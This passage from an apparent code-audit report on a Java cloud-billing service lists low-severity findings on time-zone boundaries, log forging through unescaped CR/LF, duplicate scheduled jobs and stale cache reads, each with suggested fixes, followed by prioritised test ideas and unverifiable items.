- Description: On interrupt the code throws without calling `stopQueryExecution`, unlike the timeout branch. During shutdown or executor cancellation the scan keeps running and is billed for nothing.
- Suggested fix: call `stopQueryExecution` in a `finally` when the query did not reach a terminal state.
- Status: confirmed

### B-34 Low (suspected): date-boundary semantics (UTC usage dates vs invoice time zone, partial current month)
- File: `service/gcp/GcpBillingSql.java:100` (`DATE(usage_start_time)`), `service/gcp/CspBillingQueryService.java:68-71` (`queryMonthlyHistory`), `service/gcp/CspBillingIngestionService.java` (`LocalDate.now()`), `service/gcp/GcpCostService.java` (`ZoneId.of("Asia/Kolkata")` for `lastUpdated`).
- Description: `DATE(usage_start_time)` is UTC, while Google invoices in US/Pacific, so a month's per-day sums can differ from the invoice by up to a day's usage at the edges (the code comments chose usage date over `invoice.month` on purpose, so this is a known trade-off, not an oversight). Monthly history includes the current partial month with no marker, so the latest bar looks like a cost drop. `LocalDate.now()` uses the server time zone, so month-start/end in the ingest can differ from the BigQuery date near midnight. The mix of Asia/Kolkata `lastUpdated` against `LocalDateTime.now()` elsewhere (`SnapshotFreshnessService`) makes snapshot age wrong by 5.5 h if the JVM zone is not IST.
- Suggested fix: pass explicit zones (`LocalDate.now(ZoneOffset.UTC)`, `LocalDateTime.now(ZoneOffset.UTC)` everywhere), flag the open month in history.
- Status: suspected

### B-35 Low: user-controlled values are written to logs unsanitised
- File: `controller/CostController.java` (L~40, L~70, L~110), `controller/gcp/GcpCostController.java` (`tagKey`, `accountId`), `controller/aws/AwsRightsizingController.java`, `service/cur/CurInsightCache.java:~250` (logs full cache key including raw query string).
- Description: `accountId`, `tag`, `groupBy`, `tagKey`, `instanceId` are logged with `{}` placeholders. If the log pipeline is line-oriented, CR/LF in a value forges log lines (Spring decodes `%0d%0a` in params). Low impact but trivial to fix.
- Suggested fix: sanitise (strip control characters) in a logging helper, or use a pattern layout that escapes CR/LF.
- Status: confirmed

### B-36 Low (suspected): scheduled jobs can double-fire across replicas
- File: `service/gcp/CspBillingIngestionService.java:33` (`@Scheduled(cron = "0 0 2 * * *")`).
- Description: Grep for ShedLock or similar in the module returns nothing, and the plan notes multi-replica deployment behind the gateway. If more than one `xamops-service` replica runs, each executes the nightly CSP ingest, doubling BigQuery scans and racing on the same `cached_data` keys. I did not check the deployment replica count.
- Suggested fix: a distributed lock (ShedLock or a Redis `SET NX EX`).
- Status: suspected

### B-37 Low (suspected): open-range GCP snapshots read from DB with no age limit
- File: `service/gcp/GcpCostService.java:~225-245` (`getCostBreakdownByServiceAndRegionSync` DB fallback), and the same pattern in the other `cachedDataRepository.findById(dbKey)` reads in that class.
- Description: After a Redis miss the DB row is returned if present and re-warmed for 24 h, with no freshness check. The key includes the start and end dates, so closed ranges are fine. A range whose end date is in the future (an end-of-month default) reuses the same key all month and can serve the first snapshot taken that month until something overwrites it. The class comment shows the authors fixed the same defect for empty results, not for age. I did not trace every writer, so I could not confirm that nothing refreshes these rows.
- Suggested fix: apply `SnapshotFreshnessService.ifFresh` to every DB read of open-period data.
- Status: suspected

---

## Test ideas worth adding first (highest value per effort)

1. Authorisation sweep: enumerate `@RequestMapping`s in `EbsDiskRightsizingController`, `AwsRightsizingController`, `XamOpsRightsizingController`, `CostController`, `gcp/*`, `CspBillingConfigController` and assert cross-tenant access returns 403/404 (B-01 to B-05). Note the module has no `spring-security-test`, so build the `ClientUserDetails` principal by hand.
2. `RightsizingApplyService`: waiter-failure restart (B-07) and async-boundary test (B-06).
3. `CostService`: stale DB snapshot and month rollover with a controllable clock (B-08).
4. `CurInsightCache`: canonical key, single-flight, unknown-parameter rejection (B-12, B-13).
5. `RedisCacheService`: `evict` under a throwing template, JSON `null` round trip (B-22, B-29).
6. `CspBillingQueryService`: identifier validation, null cost rows (B-05, B-25).

## Not verifiable here

Real Athena, BigQuery, Cost Explorer pagination thresholds, Redis behaviour under failure, replica count and scheduler behaviour in production, DB uniqueness on `aws_account_id`, and whether any gateway-level rule restricts the unauthorised routes listed above. B-09 and B-23 in particular need a running Spring context to confirm.
